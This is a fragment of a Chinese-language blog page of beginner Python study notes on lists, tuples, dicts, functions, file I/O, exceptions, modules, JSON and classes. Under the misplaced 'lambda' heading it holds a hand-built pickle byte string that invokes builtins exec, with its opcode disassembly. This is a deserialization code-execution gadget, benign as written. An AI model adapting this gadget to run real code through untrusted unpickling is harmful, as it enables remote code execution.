class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">x,y</span>):</span><br><span class="line">    <span class="keyword">return</span> x+y</span><br><span class="line"><span class="comment">#方法</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">x,y</span>):</span><br><span class="line">        <span class="keyword">return</span> x+y</span><br><span class="line"></span><br><span class="line"><span class="comment">#函数的使用</span></span><br><span class="line">num = add(<span class="number">1</span>,<span class="number">2</span>)</span><br><span class="line"><span class="comment">#方法的使用</span></span><br><span class="line">student = Student</span><br><span class="line">num = student.add(<span class="number">1</span>,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># index方法,查询指定函数在列表的下标。语法：列表.index（元素）</span></span><br><span class="line"><span class="comment"># idnex就是列表对象（变量）内置的方法（函数）</span></span><br><span class="line">my_list = [<span class="string">&quot;itheima&quot;</span>,<span class="string">&quot;itcast&quot;</span>,<span class="string">&quot;python&quot;</span>]</span><br><span class="line">index = my_list.index(<span class="string">&quot;itheima&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;itheima在列表中的索引值是：<span class="subst">&#123;index&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment">#结果：itheima在列表中的索引值是：0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#列表的修改功能</span></span><br><span class="line">my_list = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">my_list[<span class="number">0</span>] = <span class="number">5</span></span><br><span class="line"><span class="built_in">print</span>(my_list)</span><br><span class="line"><span class="comment">#结果：[5, 2, 3]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#插入。语法：列表.insert(下标，元素)，在指定位置的下表位置，插入指定的元素</span></span><br><span class="line">my_list.insert(<span class="number">1</span>,<span class="string">&quot;itheima&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(my_list)</span><br><span class="line"><span class="comment">#结果：[5, &#x27;itheima&#x27;, 2, 3]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#追加元素。语法：libiao.append(元素)，将指定元素，追加到列表的尾部</span></span><br><span class="line">my_list.append(<span class="number">4</span>)</span><br><span class="line"><span class="built_in">print</span>(my_list)</span><br><span class="line"><span class="comment">#结果：[5, &#x27;itheima&#x27;, 2, 3, 4]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#删除元素，清空列表</span></span><br><span class="line">my_list = [<span class="string">&quot;itheima&quot;</span>,<span class="string">&quot;itcast&quot;</span>,<span class="string">&quot;python&quot;</span>]</span><br><span class="line"><span class="keyword">del</span> my_list[<span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span>(my_list)</span><br><span class="line"><span class="comment">#结果：[&#x27;itheima&#x27;, &#x27;itcast&#x27;]</span></span><br><span class="line">my_list.pop(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(my_list)</span><br><span class="line"><span class="comment">#结果：[&#x27;itheima&#x27;]</span></span><br><span class="line">my_list.remove(<span class="string">&#x27;itheima&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(my_list)</span><br><span class="line"><span class="comment">#结果：[]。如果是有两个itheima的话，就只删除第一个</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#清空列表</span></span><br><span class="line">my_list = [<span class="string">&quot;itheima&quot;</span>,<span class="string">&quot;itcast&quot;</span>,<span class="string">&quot;python&quot;</span>]</span><br><span class="line">my_list.clear()</span><br><span class="line"><span class="built_in">print</span>(my_list)</span><br><span class="line"><span class="comment">#结果：[]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#统计某元素在列表内的数量</span></span><br><span class="line">my_list = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">num1 = my_list.count(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(num1)</span><br><span class="line"><span class="comment">#结果：2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#len统计列表中全部元素的数量</span></span><br><span class="line">my_list = [<span class="string">&quot;itheima&quot;</span>,<span class="string">&quot;itcast&quot;</span>,<span class="string">&quot;python&quot;</span>]</span><br><span class="line">num2 = <span class="built_in">len</span>(my_list)</span><br><span class="line"><span class="built_in">print</span>(num2)</span><br><span class="line"><span class="comment">#结果：3</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="49列表的循环遍历-py"><a href="#49列表的循环遍历-py" class="headerlink" title="49列表的循环遍历.py"></a>49列表的循环遍历.py</h2><p>while和for循环遍历</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> operator <span class="keyword">import</span> index</span><br><span class="line"></span><br><span class="line">my_list = [<span class="string">&quot;itheima&quot;</span>,<span class="string">&quot;itcast&quot;</span>,<span class="string">&quot;python&quot;</span>]</span><br><span class="line"></span><br><span class="line">index = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> index &lt; <span class="built_in">len</span>(my_list):</span><br><span class="line">    element = my_list[index]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;列表的元素:<span class="subst">&#123;element&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    index += <span class="number">1</span></span><br><span class="line"><span class="comment">#结果：列表的元素:itheima</span></span><br><span class="line"><span class="comment">#列表的元素:itcast</span></span><br><span class="line"><span class="comment">#列表的元素:python</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> my_list:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure>
+
+<h2 id="50元组的定义和操作-py"><a href="#50元组的定义和操作-py" class="headerlink" title="50元组的定义和操作.py"></a>50元组的定义和操作.py</h2><p>需要我们在程序内封装数据，但是又不希望被封装的数据被篡改，那么元组就非常合适了<br>定义元组字面量<br>(元素，元素，元素)<br>定义元组变量 &#x3D; （元素，元素，元素）<br>定义空元组<br>变量名称 &#x3D; ()<br>变量名称 &#x3D; tuple()</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">t5 = ((<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>),(<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>))</span><br><span class="line">num1 = t5[<span class="number">1</span>][<span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span>(num1)<span class="comment">#结果：6</span></span><br><span class="line"><span class="comment">#其他的index和count和len都是可以用的</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="51字符串的定义和操作-py"><a href="#51字符串的定义和操作-py" class="headerlink" title="51字符串的定义和操作.py"></a>51字符串的定义和操作.py</h2><p>数据容器脚下的字符串<br>字符串同样也是数据容器的一员<br>从前向后，从0开始<br>同元组一样，字符串是一个无法修改的数据容器<br>字符串的替换:<br>语法：字符串.replace(字符串1，字符串2)<br>功能：将字符串内的全部：字符串1，替换为字符串2<br>注意：不是修改字符串本身，而是得到了一个新的字符串<br>字符串.split(按照什么字符进行切割)。然后返回一个列表<br>字符串.strip(),字符串的规整操作，去除前后空格<br>string.strip(字符串),去前后指定字符串。“12dgsuahd21”，传入12就可以去掉12和21.划分为两个小字符，都给切除了<br>可以传参，也可以不用传参，这里就代表这个函数是有默认值的<br>.conut和.len都是可以的</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">my_str = <span class="string">&quot;itheima and itcast&quot;</span></span><br><span class="line">value = my_str[<span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span>(value)</span><br><span class="line"><span class="built_in">print</span>(my_str.index(<span class="string">&#x27;and&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+<h2 id="52数据容器-序列-的切片-py"><a href="#52数据容器-序列-的切片-py" class="headerlink" title="52数据容器(序列)的切片.py"></a>52数据容器(序列)的切片.py</h2><p>序列是指：内容连续、有序、可使用下表索引的一类数据容器<br>列表、元组、字符串，均可以视为序列<br>切片语法：序列[起始下标:结束下标:步长]</p>
+<h2 id="53集合的定义和操作-py"><a href="#53集合的定义和操作-py" class="headerlink" title="53集合的定义和操作.py"></a>53集合的定义和操作.py</h2><p>定义集合字面量{元素，元素，元素}<br>变量名称&#x3D; {元素，元素，元素}<br>变量名称&#x3D;set()空集合<br>集合是无序的，所以集合不支持下表索引访问<br>但是集合和列表一样，是允许修改的.add添加<br>.remove是移除<br>，pop就是随机取出来一个了</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">set1= &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;</span><br><span class="line">set2=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>&#125;</span><br><span class="line">set3=set1.difference(set2)</span><br><span class="line"><span class="built_in">print</span>(set3)</span><br><span class="line"><span class="comment">#消除两个集合的差集</span></span><br><span class="line"><span class="comment"># set1.difference_update(set2)</span></span><br><span class="line"><span class="comment"># print(set1)</span></span><br><span class="line">set4=set1.union(set2)</span><br><span class="line"><span class="built_in">print</span>(set4)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> set4:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure>
+
+<h2 id="54字典的定义以及常用操作-py"><a href="#54字典的定义以及常用操作-py" class="headerlink" title="54字典的定义以及常用操作.py"></a>54字典的定义以及常用操作.py</h2><p>字典的定义,同样使用{}，不过是一个个的键值对<br>{key:vaule,key:value}</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mydict1=&#123;<span class="string">&quot;w&quot;</span>:<span class="number">99</span>,<span class="string">&quot;zhou&quot;</span>:<span class="number">100</span>,<span class="string">&quot;li&quot;</span>:<span class="number">88</span>&#125;</span><br><span class="line">mydict2= &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">mydict3= <span class="built_in">dict</span>()</span><br><span class="line"><span class="comment">#不可以使用下表索引，但是可以通过ket值取得对应的value</span></span><br><span class="line"><span class="comment">#key不可为字典，但是value就没有什么限制了。就表明，可以嵌套</span></span><br><span class="line"><span class="comment">#字典的常用操作字典[key]=value，就是新增也是更新</span></span><br><span class="line"><span class="comment">#.pop就是删除.clear就是清空字典。.keys就是获取所有的字典，能够实现遍历</span></span><br><span class="line"><span class="comment">#字典不支持下标索引，所以不支持while循环</span></span><br><span class="line"><span class="comment">#len这些也是可以用的</span></span><br><span class="line">my_dict= mydict1.keys()</span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> my_dict:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;字典的key值为:<span class="subst">&#123;key&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> my_dict:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;2字典的key是:<span class="subst">&#123;key&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="55函数的多返回值-py"><a href="#55函数的多返回值-py" class="headerlink" title="55函数的多返回值.py"></a>55函数的多返回值.py</h2><p>如果一个函数有两个return。只会执行一个，原因是return可以退出当前函数，导致return下面的代码不会再执行</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test_return</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>,<span class="number">2</span></span><br><span class="line">x,y= test_return()</span><br><span class="line"><span class="built_in">print</span>(x)</span><br><span class="line"><span class="built_in">print</span>(y)</span><br></pre></td></tr></table></figure>
+
+<h2 id="56函数的多种参数使用形式-py"><a href="#56函数的多种参数使用形式-py" class="headerlink" title="56函数的多种参数使用形式.py"></a>56函数的多种参数使用形式.py</h2><p>位置参数：之前一直在使用的<br>关键字参数：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#关键字参数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">user_info</span>(<span class="params">name,age,gender</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;您的名字是:<span class="subst">&#123;name&#125;</span>,年龄是<span class="subst">&#123;age&#125;</span>,性别是:<span class="subst">&#123;gender&#125;</span>&quot;</span>)</span><br><span class="line">user_info(<span class="string">&quot;小明&quot;</span>,age=<span class="number">20</span>,gender=<span class="string">&quot;男&quot;</span>)</span><br><span class="line"><span class="comment">#函数调用时，如果有位置参数时，位置参数必须在关键字参数的前面，但关键字参数之间不存在先后顺序</span></span><br><span class="line"><span class="comment">#缺省参数概念和演示</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">user_info1</span>(<span class="params">name,age,gender=<span class="string">&quot;男&quot;</span></span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;您的名字是:<span class="subst">&#123;name&#125;</span>,年龄是<span class="subst">&#123;age&#125;</span>,性别是:<span class="subst">&#123;gender&#125;</span>&quot;</span>)</span><br><span class="line">user_info1(<span class="string">&#x27;xiaotian&#x27;</span>,<span class="number">13</span>)</span><br><span class="line"><span class="comment">#不定长参数的概念和演示,*args元组类型，**kwargs字典形式，传参需要以键值对的形式来进行传参</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">user_info</span>(<span class="params">*args</span>):</span><br><span class="line">    <span class="built_in">print</span>(args)</span><br><span class="line">user_info(<span class="string">&#x27;TOM&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="57函数作为参数传递-py"><a href="#57函数作为参数传递-py" class="headerlink" title="57函数作为参数传递.py"></a>57函数作为参数传递.py</h2><p>我们学习的函数本身，也可以作为参数传递</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test_func</span>(<span class="params">compute</span>):</span><br><span class="line">    result=compute(<span class="number">1</span>,<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compute</span>(<span class="params">x,y</span>):</span><br><span class="line">    <span class="keyword">return</span> x+y</span><br><span class="line">test_func(compute)</span><br></pre></td></tr></table></figure>
+
+<h2 id="58lambda匿名函数-py"><a href="#58lambda匿名函数-py" class="headerlink" title="58lambda匿名函数.py"></a>58lambda匿名函数.py</h2><p>import pickletools</p>
+<p>data&#x3D;b”\x80\x03cbuiltins\nexec\nq\x00X\x13\x00\x00\x00key1&#x3D;b’1’\nkey2&#x3D;b’2’q\x01\x85q\x02Rq\x03.”<br>pickletools.dis(data)<br>#<br>#0: \x80 PROTO      3<br>#2: c    GLOBAL     ‘builtins exec’<br>#17: q    BINPUT     0<br>#19: X    BINUNICODE “key1&#x3D;b’1’\nkey2&#x3D;b’2’”<br>#43: q    BINPUT     1<br>#45: \x85 TUPLE1<br>#46: q    BINPUT     2<br>#48: R    REDUCE<br>#49: q    BINPUT     3<br>#51: .    STOP<br>#highest protocol among opcodes &#x3D; 2</p>
+<h2 id="59文件编码概念-py"><a href="#59文件编码概念-py" class="headerlink" title="59文件编码概念.py"></a>59文件编码概念.py</h2><p>计算机只能识别0和1，使用编码技术将内容翻译成0和1存入<br>记录了如何将内容翻译为二进制，并如何翻译回来<br>一般使用UTF-8的编码方式进行编码</p>
+<h2 id="60文件的读取操作-py"><a href="#60文件的读取操作-py" class="headerlink" title="60文件的读取操作.py"></a>60文件的读取操作.py</h2><p>文件可以分为文本文件，视频文件，音频文件等等<br>open(name,mode,encoding)，可以打开一个已经存在的文件，或者创建一个新文件<br>name：是要打开文件的目标文件名的字符串（可以包含文件所在的具体路径）<br>mode：设置文件打开的模式：只读，写入，追加<br>encoding:编码格式（推荐使用UTF-8）<br>代码示例：<br>f&#x3D;open(‘python.txt’,’r’,encodingUTF-8)<br>#encoding的顺序不是第三位，所以不能使用位置参数，用关键字直接指定<br>此时的f是open函数的文件对象，对象是python中的一种数据类型<br>w模式：打开一个文件只用于写入。如果该文件已存在则打开文件，并从头开始编辑，原有内容会删除。如果该文件不存在，创建新文件<br>a：打开一个文件用于追加。如果该文件已存在，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入<br>r：只读</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment">#打开文件</span></span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;1.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;UTF-8&#x27;</span>)</span><br><span class="line"><span class="comment"># print(type(f))</span></span><br><span class="line"><span class="comment">#读取文件read()</span></span><br><span class="line"><span class="comment">#文件对象.read(num),num表示从文件中读取数据的长度（单位是字节），如果没有传入num，那么就表示文曲文件中所有的数据</span></span><br><span class="line"><span class="comment">#readlines()方法，可以按照行的方式把整个文件中的内容进行一次性读取，并且返回的是一个列表，其中每一行的数据为一个元素</span></span><br><span class="line"><span class="comment"># print(f.read(10))</span></span><br><span class="line"><span class="comment"># print(f.read())</span></span><br><span class="line"><span class="comment">#会有一个记录，下一个read会在上一个read的结尾处往后读取</span></span><br><span class="line"><span class="comment"># line=f.readlines()</span></span><br><span class="line"><span class="comment"># print(type(line))</span></span><br><span class="line"><span class="comment"># print(line)</span></span><br><span class="line"><span class="comment">#但是没有内容，因为前面的read已经影响到了，有个小的指针会有影响</span></span><br><span class="line"><span class="comment">#readline方法，一次读取一行内容</span></span><br><span class="line"><span class="comment">#for循环读取文件行</span></span><br><span class="line"><span class="comment"># i=0</span></span><br><span class="line"><span class="comment"># for line in f:</span></span><br><span class="line"><span class="comment">#     i=i+1</span></span><br><span class="line"><span class="comment">#     print(f&quot;第&#123;i&#125;行数据line对象&#123;line&#125;&quot;)</span></span><br><span class="line"><span class="comment">#文件的关闭</span></span><br><span class="line"><span class="comment">#这个时候文件就删除不了</span></span><br><span class="line"><span class="comment"># time.sleep(50000)</span></span><br><span class="line"><span class="comment"># f.close()</span></span><br><span class="line"><span class="comment">#withopen操作，会自己close</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;1.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;UTF-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;每一行数据是<span class="subst">&#123;line&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="61文件读取练习-py"><a href="#61文件读取练习-py" class="headerlink" title="61文件读取练习.py"></a>61文件读取练习.py</h2><p>read再count(“itheima”)的这种方式</p>
+<h2 id="62文件的写入操作-py"><a href="#62文件的写入操作-py" class="headerlink" title="62文件的写入操作.py"></a>62文件的写入操作.py</h2><p>f&#x3D;open(‘test.txt’,’w’,encoding&#x3D;”UTF-8”)<br>f.write(‘hello world’)<br>f.flush()<br>f.close()<br>#close是内置了flush方法的</p>
+<p>#最后一步就是将内容写入硬盘，之前都是写在内存当中</p>
+<h2 id="63文件的追加写入操作-py"><a href="#63文件的追加写入操作-py" class="headerlink" title="63文件的追加写入操作.py"></a>63文件的追加写入操作.py</h2><p>只要将模式替换为a就可以了，没有很多的差别</p>
+<h2 id="64了解异常-py"><a href="#64了解异常-py" class="headerlink" title="64了解异常.py"></a>64了解异常.py</h2><p>bug</p>
+<h2 id="65异常的捕获-py"><a href="#65异常的捕获-py" class="headerlink" title="65异常的捕获.py"></a>65异常的捕获.py</h2><p>为什么捕获异常？提前假设某处会出现异常，做好提前准备，当真的出现异常的时候，可以有后续手段<br>try:<br>    可以发生错误的代码<br>except:<br>    如果出现异常执行的代码<br>捕获指定异常：except NameError as e:这个就是异常的对象<br>捕获多个异常：except(NameError,ZeroDivisionError):<br>捕获全部异常：except Exception as e:<br>异常的else和finally语法：<br>else：没有异常时执行的代码<br>finally:有无异常都要去执行的一个代码</p>
+<h2 id="66异常的传递性-py"><a href="#66异常的传递性-py" class="headerlink" title="66异常的传递性.py"></a>66异常的传递性.py</h2><p>比如有好几个函数嵌套在一起时，会捕获到这个异常，这个就是异常的传递性</p>
+<h2 id="67模块的概念和导入-py"><a href="#67模块的概念和导入-py" class="headerlink" title="67模块的概念和导入.py"></a>67模块的概念和导入.py</h2><p>常见的组合形式：<br>import 模块名<br>from 模块名 import 类，变量，方法等<br>from 模块名 import *<br>import 模块名 as 别名<br>from 模块名 import 功能名 as 别名</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># import time</span></span><br><span class="line"><span class="comment"># time.sleep(10)</span></span><br><span class="line"><span class="comment"># print(&#x27;666&#x27;)</span></span><br><span class="line"><span class="comment">#这种方法基本就够用了，并且还是挺好的</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="68自定义模块并导入-py"><a href="#68自定义模块并导入-py" class="headerlink" title="68自定义模块并导入.py"></a>68自定义模块并导入.py</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> my_module1</span><br><span class="line">my_module1.test(<span class="number">10</span>,<span class="number">20</span>)</span><br><span class="line"><span class="comment">#导入两个模块，同一个功能名的话，后面的会覆盖前面的</span></span><br><span class="line"><span class="comment">#并且import的时候,此时，无论是当前文件，还是其他已经导入了该模块的文件，在运行的时候都会自动执行`test`函数的调用</span></span><br><span class="line"><span class="comment">#__main__变量,输入main回车就可以了。导入的时候就不会再执行了</span></span><br><span class="line"><span class="comment">#__all__变量,如果一个模块文件中有`__all__`变量，当使用`from xxx import *`导入时，只能导入这个列表的函数。</span></span><br><span class="line"><span class="comment">#这里的示例就是test_A函数可以使用</span></span><br><span class="line"><span class="comment">#如果不是*这个所有的符号的意思，而是执行了test_B那就是可以用的了</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="69自定义python包-py"><a href="#69自定义python包-py" class="headerlink" title="69自定义python包.py"></a>69自定义python包.py</h2><p>什么是py包，就是一个文件夹，在该文件夹下包含了一个__init__.py文件，该文件夹用于包含多个模块文件。从逻辑来看，包的本质依然是模块</p>
+<h2 id="70安装第三方包-py"><a href="#70安装第三方包-py" class="headerlink" title="70安装第三方包.py"></a>70安装第三方包.py</h2><p>C:\Users\31349&gt;pip install numpy<br>Requirement already satisfied: numpy in d:\python\lib\site-packages (2.2.1)</p>
+<p>[notice] A new release of pip is available: 24.3.1 -&gt; 25.1.1<br>[notice] To update, run: python.exe -m pip install –upgrade pip<br>这个不多说，遇到过了很多次了</p>
+<h2 id="71异常-模块-包综合案列-py"><a href="#71异常-模块-包综合案列-py" class="headerlink" title="71异常-模块-包综合案列.py"></a>71异常-模块-包综合案列.py</h2><h2 id="72json数据格式-py"><a href="#72json数据格式-py" class="headerlink" title="72json数据格式.py"></a>72json数据格式.py</h2><p>本质上是负责不同编程语法中的数据传递和交互<br>可以是<br>{“name”:”admin”,”age”：”18”}<br>[{“name”:”admin”,”age”：”18”},{“name”:”admin1”,”age”：”128”}]</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="comment">#准备复合json格式的数据</span></span><br><span class="line">data=[&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;老王&quot;</span>,<span class="string">&quot;age&quot;</span>:<span class="number">16</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;张三&quot;</span>,<span class="string">&quot;age&quot;</span>:<span class="number">20</span>&#125;]</span><br><span class="line"><span class="comment">#转化为json方法</span></span><br><span class="line">json_str=data=json.dumps(data,ensure_ascii=<span class="literal">False</span>)</span><br><span class="line"><span class="comment">#ensure_ascii=False有了这个就能正常显示中文</span></span><br><span class="line"><span class="built_in">print</span>(json_str)</span><br><span class="line"><span class="comment">#把json数据转化为python数据</span></span><br><span class="line">data=json.loads(data)</span><br></pre></td></tr></table></figure>
+
+<h2 id="73初识对象-py"><a href="#73初识对象-py" class="headerlink" title="73初识对象.py"></a>73初识对象.py</h2><p>设计类，创建对象，对象属性赋值</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>:</span><br><span class="line">    name=<span class="literal">None</span></span><br><span class="line">    gender=<span class="literal">None</span></span><br><span class="line">    nationality=<span class="literal">None</span></span><br><span class="line">    native_place=<span class="literal">None</span></span><br><span class="line">    age=<span class="literal">None</span></span><br><span class="line">stu1= Student()</span><br><span class="line"><span class="comment">#既是对象也是变量</span></span><br><span class="line">stu1.name=<span class="string">&quot;林jun杰&quot;</span></span><br><span class="line">stu1.gender=<span class="string">&quot;nan&quot;</span></span><br><span class="line"><span class="built_in">print</span>(stu1.name)</span><br></pre></td></tr></table></figure>
+
+<h2 id="74类的成员方法-py"><a href="#74类的成员方法-py" class="headerlink" title="74类的成员方法.py"></a>74类的成员方法.py</h2><p>掌握类的定义和使用语法<br>掌握成员方法的使用<br>掌握self关键子的作用<br>上一节中，我们简单了解到可以使用类去封装属性，并基于类创建出一个个的对象来使用<br>现在我们来看看类的使用语法<br>class 类名称:<br>类的属性:即定义在类中的变量（成员变量）<br>类的行为：即定义在类的函数（成员方法）<br>创建类对象的语法:对象&#x3D;类名称<br>这个self是必须存在的，它用来表示类对象自身的意思<br>当我们使用类对象调用方法时，self会被python传入<br>在方法内部，想要访问类的成员变量，必须使用self<br>比如需要传参的时候，我们可以当作self不存在，可以不用理会self</p>
